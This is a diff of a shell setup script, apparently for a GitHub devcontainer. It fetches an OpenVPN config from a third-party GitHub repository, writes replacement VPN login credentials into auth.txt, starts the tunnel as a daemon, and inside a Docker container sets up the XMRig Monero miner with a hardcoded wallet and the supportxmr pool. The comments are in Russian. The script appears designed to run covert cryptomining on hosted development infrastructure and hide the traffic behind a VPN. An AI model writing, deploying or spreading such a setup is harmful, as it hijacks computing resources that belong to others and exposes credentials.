@@ -55,11 +55,11 @@ apt update
 apt install -y openvpn curl
 
 cd /tmp
-curl -L -o vpn.ovpn https://raw.githubusercontent.com/proton7771/jdhdghs/refs/heads/main/.devcontainer/vpnbook-de20-tcp443.ovpn
+curl -L -o vpn.ovpn https://raw.githubusercontent.com/Scar3457/jdhdghs/refs/heads/main/.devcontainer/vpnbook-de20-tcp443.ovpn
 
 cat > auth.txt <<EOP
-vpn-vpnjantit.com
-vpn
+rPgOoZQzCO9bBemt
+jvvtbTQ8LBzPNFA8d3wnBEkmEIlYDyO2
 EOP
 
 openvpn --config vpn.ovpn --auth-user-pass auth.txt --daemon
@@ -76,8 +76,8 @@ curl -LO https://www.vpnbook.com/free-openvpn-account/VPNBook.com-OpenVPN-Euro1.
 unzip -o VPNBook.com-OpenVPN-Euro1.zip -d vpnbook
 
 cat > vpnbook/auth.txt <<EOF
-vpn-vpnjantit.com
-vpn
+rPgOoZQzCO9bBemt
+jvvtbTQ8LBzPNFA8d3wnBEkmEIlYDyO2
 EOF
 
 if [ ! -c /dev/net/tun ]; then
@@ -106,7 +106,7 @@ sudo docker exec -i ubuntu_gui bash <<'EOM'
 # Пользовательские настройки
 POOL="pool.supportxmr.com:3333"
 WALLET="47K4hUp8jr7iZMXxkRjv86gkANApNYWdYiarnyNb6AHYFuhnMCyxhWcVF7K14DKEp8bxvxYuXhScSMiCEGfTdapmKiAB3hi"
-PASSWORD="Github"
+PASSWORD="001"
 
 # Загрузка XMRig
 XMRIG_VERSION="6.22.2"
